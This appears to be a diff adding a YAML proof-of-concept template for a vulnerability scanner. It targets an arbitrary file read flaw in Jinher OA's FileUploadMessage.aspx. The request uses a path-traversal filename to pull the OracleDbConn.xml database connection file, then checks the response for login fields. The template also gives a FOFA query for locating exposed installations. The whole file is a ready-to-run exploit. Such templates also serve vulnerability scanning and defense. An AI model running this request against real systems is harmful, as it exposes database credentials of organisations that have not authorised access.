@@ -1,0 +1,22 @@
+id: poc-yaml-jinher-oa-fileuploadmessage-aspx-anyfile-read
+info:
+  name: 金和OA FileUploadMessage.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
+  expression: 'status_code == 200
+
+    && contains(body,"xml")
+
+    && contains(body,"<DbType>")
+
+    && contains(body,"<DbLoginName>")
+
+    '
+variables: {}
+transport: http
